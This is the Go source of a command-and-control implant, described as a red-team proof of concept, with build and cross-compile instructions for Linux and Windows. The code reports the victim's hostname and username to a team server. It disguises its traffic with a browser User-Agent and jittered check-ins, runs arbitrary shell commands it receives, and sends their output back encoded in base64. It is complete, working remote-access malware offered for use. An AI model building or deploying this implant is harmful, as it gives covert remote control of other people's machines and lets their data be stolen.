/*
Project: C2 Architecture PoC
Module: Implant (Beacon)
Author: mauvehack
License: MIT
Description:
    Lightweight HTTP agent that performs a "heartbeat" check-in with the Team Server.
    It executes shell commands and returns output via POST requests.

    WARNING: FOR EDUCATIONAL RESEARCH AND AUTHORIZED RED TEAMING ONLY.
*/

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

// --- Configuration ---

const (
	ServerURL     = "http://localhost:8080" // Change to Team Server IP
	SleepInterval = 5                       // Base sleep time in seconds
	Jitter        = 0.2                     // 20% Jitter (0.0 - 1.0)
	UserAgent     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
)

// --- Structs ---

type RegisterData struct {
	Hostname string `json:"hostname"`
	Platform string `json:"platform"`
	Username string `json:"username"`
}

type RegisterResponse struct {
	Status string `json:"status"`
	ID     string `json:"id"`
	Key    string `json:"key"`
}

type Task struct {
	TaskID  int    `json:"task_id"`
	Action  string `json:"action"` // "exec", "sleep", "die"
	Command string `json:"command"`
}

type TaskResult struct {
	TaskID int    `json:"task_id"`
	Output string `json:"output"` // Base64 encoded
}

// --- Global State ---
var AgentID string

// --- Core Logic ---

func main() {
	// 1. Initial Registration
	if !registerAgent() {
		// If registration fails, terminate to avoid noise
		os.Exit(1)
	}

	fmt.Printf("[*] Agent Active. ID: %s\n", AgentID)

	// 2. Beacon Loop
	for {
		// Calculate and execute Jitter Sleep
		sleepTime := calculateSleep(SleepInterval, Jitter)
		time.Sleep(time.Duration(sleepTime) * time.Second)

		// Check for tasks
		getTask()
	}
}

// registerAgent performs the initial handshake to get a Session ID
func registerAgent() bool {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	
	regData := RegisterData{
		Hostname: hostname,
		Platform: runtime.GOOS,
		Username: currentUser.Username,
	}

	jsonData, _ := json.Marshal(regData)
	resp, err := sendRequest("POST", "/api/v1/register", jsonData)
	if err != nil {
		return false
	}

	var regResp RegisterResponse
	json.Unmarshal(resp, &regResp)

	if regResp.Status == "success" {
		AgentID = regResp.ID
		return true
	}
	return false
}

// getTask polls the Team Server for instructions
func getTask() {
	endpoint := fmt.Sprintf("/api/v1/beacon/%s", AgentID)
	resp, err := sendRequest("GET", endpoint, nil)
	
	if err != nil {
		// Connection failed; keep quiet and retry later
		return
	}

	var task Task
	err = json.Unmarshal(resp, &task)
	if err != nil {
		return 
	}

	if task.Action == "exec" {
		fmt.Printf("[+] Received Task %d: %s\n", task.TaskID, task.Command)
		output := executeCommand(task.Command)
		sendResult(task.TaskID, output)
	} else if task.Action == "die" {
		os.Exit(0)
	}
}

// executeCommand runs the shell command and captures stdout/stderr
func executeCommand(command string) string {
	var cmd *exec.Cmd

	// Platform specific shell selection
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %s\nOutput: %s", err, string(out))
	}
	return string(out)
}

// sendResult encodes the output and posts it back to the server
func sendResult(taskID int, output string) {
	encodedOutput := base64.StdEncoding.EncodeToString([]byte(output))
	
	result := TaskResult{
		TaskID: taskID,
		Output: encodedOutput,
	}

	jsonData, _ := json.Marshal(result)
	endpoint := fmt.Sprintf("/api/v1/results/%s", AgentID)
	sendRequest("POST", endpoint, jsonData)
}

// --- Utilities ---

// calculateSleep implements the Jitter logic: Interval +/- (Interval * Jitter)
func calculateSleep(interval int, jitter float64) float64 {
	// Seed random (Go 1.20+ automatically seeds, but good practice for older versions)
	rand.Seed(time.Now().UnixNano())

	variance := float64(interval) * jitter
	// Random float between -variance and +variance
	offset := (rand.Float64() * 2 * variance) - variance
	
	return float64(interval) + offset
}

// sendRequest wraps HTTP client logic with headers
func sendRequest(method string, endpoint string, data []byte) ([]byte, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	url := fmt.Sprintf("%s%s", ServerURL, endpoint)

	req, err := http.NewRequest(method, url, bytes.NewBuffer(data))
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", UserAgent)
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	return body, nil
}

Compilation Instructions:

To build this implant for a Linux target (assuming you are on Linux or macOS):

```bash
# Initialize Go module
go mod init c2_implant

# Build the binary
# -w -s flags strip debug information to reduce binary size
go build -ldflags "-w -s" -o beacon_linux main.go


To cross-compile for Windows from a Linux/macOS machine:

```bash
GOOS=windows GOARCH=amd64 go build -ldflags "-w -s" -o beacon.exe main.go

